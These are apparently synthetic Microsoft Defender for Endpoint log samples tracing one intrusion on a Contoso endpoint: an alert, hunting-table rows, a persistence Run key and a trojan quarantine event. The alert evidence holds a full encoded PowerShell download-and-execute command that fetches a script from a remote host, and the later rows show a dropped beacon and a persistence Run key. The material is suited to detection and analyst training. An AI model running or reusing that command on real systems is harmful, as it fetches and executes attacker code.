# Microsoft Defender for Endpoint (MDE) Log Samples

## Windows Event Log (Security Event ID 5156 - Network connection)

```
Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          8/25/2024 11:45:22 AM
Event ID:      5156
Task Category: Filtering Platform Connection
Level:         Information
Keywords:      Audit Success
User:          N/A
Computer:      ENDPOINT01.corp.contoso.com
Description:
The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4828
	Application Name:	\device\harddiskvolume2\program files\microsoft defender advanced threat protection\senseir.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.1.2.35
	Source Port:		49721
	Destination Address:	20.190.128.64
	Destination Port:	443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	66629
	Layer Name:		Connect
	Layer Run-Time ID:	13
```

## Microsoft Defender for Endpoint Alert (From Security Center API)

```json
{
  "id": "da637726511232392019_-1196456995",
  "incidentId": 729073,
  "investigationId": 826555,
  "assignedTo": "securityadmin@contoso.com",
  "severity": "High",
  "status": "New",
  "classification": null,
  "determination": null,
  "investigationState": "Running",
  "detectionSource": "WindowsDefenderAtp",
  "category": "CommandAndControl",
  "threatName": "Suspicious outbound connection to uncommon port",
  "threatFamilyName": null,
  "title": "Suspicious outbound connection to uncommon port",
  "description": "A process on this machine established a connection to a remote host on an uncommon port. This could be indicative of lateral movement or command-and-control activity.",
  "alertCreationTime": "2024-08-25T11:45:30.1932456Z",
  "firstEventTime": "2024-08-25T11:43:22.43Z",
  "lastEventTime": "2024-08-25T11:43:22.43Z",
  "lastUpdateTime": "2024-08-25T11:45:30.32Z",
  "resolvedTime": null,
  "machineId": "a5846dcf5aa542a1bff8f6191feddeb8ab65ed69",
  "computerDnsName": "ENDPOINT01.corp.contoso.com",
  "aadTenantId": "b3c109be-f251-4305-9c3e-45d8d99ef025",
  "relatedUser": {
    "userName": "jsmith",
    "domainName": "CONTOSO"
  },
  "comments": [],
  "evidence": [
    {
      "entityType": "Process",
      "evidenceCreationTime": "2024-08-25T11:45:30.2432456Z",
      "sha1": "4a6e9e7e23e0723e5f9c52f88495d594bfe80904",
      "sha256": "b48396caf8936ff873e2bdb563c6b0691513f9c2d1507eee30c00c99394bd392",
      "fileName": "powershell.exe",
      "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "processId": 4556,
      "processCommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAOgA4ADAAOAAwAC8AYwBtAGQALgBwAHMAMQAnACkA",
      "processCreationTime": "2024-08-25T11:43:20.1932456Z",
      "parentProcessId": 2345,
      "parentProcessCreationTime": "2024-08-25T08:42:15.5432456Z",
      "userSid": "S-1-5-21-1721254763-462695806-1538882281-2345",
      "userPrincipalName": "jsmith@contoso.com"
    },
    {
      "entityType": "Connection",
      "evidenceCreationTime": "2024-08-25T11:45:30.2432456Z",
      "localIP": "10.1.2.35",
      "localPort": 52123,
      "remoteIP": "192.168.1.10",
      "remotePort": 8080,
      "protocol": "Tcp"
    }
  ]
}
```

## Microsoft Defender for Endpoint Advanced Hunting Query Result (DeviceNetworkEvents)

```
Timestamp               | DeviceName                | InitiatingProcessFileName | LocalIP    | LocalPort | RemoteIP      | RemotePort | ActionType | RemoteUrl                        | InitiatingProcessId | InitiatingProcessCommandLine
------------------------|---------------------------|---------------------------|------------|-----------|---------------|------------|------------|----------------------------------|---------------------|------------------------------------------------------------------------------------
2024-08-25T11:43:22.43Z | ENDPOINT01.corp.contoso.com | powershell.exe           | 10.1.2.35  | 52123     | 192.168.1.10  | 8080       | Connection | http://192.168.1.10:8080/cmd.ps1 | 4556                | powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIA...
2024-08-25T11:43:25.16Z | ENDPOINT01.corp.contoso.com | powershell.exe           | 10.1.2.35  | 52124     | 192.168.1.10  | 8080       | Connection | http://192.168.1.10:8080/beacon  | 4556                | powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIA...
```

## Microsoft Defender for Endpoint Device Timeline (DeviceProcessEvents)

```
Timestamp               | DeviceName                | ActionType    | FileName        | FolderPath                                     | SHA256                                                           | ProcessId | ProcessCommandLine                                                                | InitiatingProcessFileName | InitiatingProcessId | InitiatingProcessCommandLine
------------------------|---------------------------|---------------|-----------------|------------------------------------------------|------------------------------------------------------------------|-----------|----------------------------------------------------------------------------------|---------------------------|---------------------|------------------------------------------
2024-08-25T11:43:20.19Z | ENDPOINT01.corp.contoso.com | ProcessCreated | powershell.exe | C:\Windows\System32\WindowsPowerShell\v1.0\    | b48396caf8936ff873e2bdb563c6b0691513f9c2d1507eee30c00c99394bd392 | 4556      | powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIA... | explorer.exe             | 2345                | "C:\Windows\explorer.exe"
```

## Microsoft Defender for Endpoint File Creation Event (DeviceFileEvents)

```
Timestamp               | DeviceName                | ActionType  | FileName    | FolderPath          | SHA256                                                           | InitiatingProcessFileName | InitiatingProcessId | InitiatingProcessCommandLine
------------------------|---------------------------|-------------|------------|---------------------|------------------------------------------------------------------|---------------------------|---------------------|-----------------------------------------------------------------------------------
2024-08-25T11:43:30.45Z | ENDPOINT01.corp.contoso.com | FileCreated | beacon.exe | C:\Users\jsmith\AppData\Local\Temp\ | fc713a6734d9346a4ac740495facbac5732427d2b0452d693ed3439589f69781 | powershell.exe           | 4556                | powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIA...
```

## Microsoft Defender for Endpoint Registry Modification (DeviceRegistryEvents)

```
Timestamp               | DeviceName                | ActionType          | RegistryKey                                                                           | RegistryValueName    | RegistryValueData                       | InitiatingProcessFileName | InitiatingProcessId
------------------------|---------------------------|---------------------|----------------------------------------------------------------------------------------|----------------------|------------------------------------------|---------------------------|--------------------
2024-08-25T11:43:35.12Z | ENDPOINT01.corp.contoso.com | RegistryValueSet    | HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run                      | Beacon               | C:\Users\jsmith\AppData\Local\Temp\beacon.exe | powershell.exe           | 4556
```

## Windows Defender Antivirus Detection (Event ID 1116)

```
Log Name:      Microsoft-Windows-Windows Defender/Operational
Source:        Microsoft-Windows-Windows Defender
Date:          8/25/2024 11:50:22 AM
Event ID:      1116
Task Category: None
Level:         Warning
Keywords:      
User:          SYSTEM
Computer:      ENDPOINT01.corp.contoso.com
Description:
Windows Defender Antivirus has detected malware or other potentially unwanted software.

Name: Trojan:Win32/Downloader.ABC
ID: 2147726134
Severity: High

Category: Trojan

Path: C:\Users\jsmith\AppData\Local\Temp\beacon.exe

Detection Origin: Local machine
Detection Type: Concrete
Detection Source: Real-Time Protection

Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: CONTOSO\jsmith

Status: Quarantined
Status Code: 2
Status Description: The operation was successful.
```
